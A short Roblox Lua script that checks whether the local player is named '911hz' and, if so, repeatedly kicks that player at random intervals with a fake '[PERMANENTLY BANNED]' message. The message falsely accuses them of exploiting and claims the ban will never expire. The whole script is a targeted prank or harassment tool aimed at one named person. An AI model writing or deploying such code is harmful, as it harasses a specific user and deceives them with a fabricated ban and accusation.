

local function randomban()
  local Players = game:GetService("Players")
  local player = Players.LocalPlayer
  local targetName = "911hz"
  if player.Name == targetName then
      task.spawn(function()
          while true do
              task.wait(1)
              if math.random(1, 2) == 1 then
                  player:Kick("[PERMANENTLY BANNED] Reason: Exploiting/Cheating. This ban will not expire. Please contact support if you believe this is an error.")
              end
          end
      end)
  end
end




coroutine.wrap(randomban)()
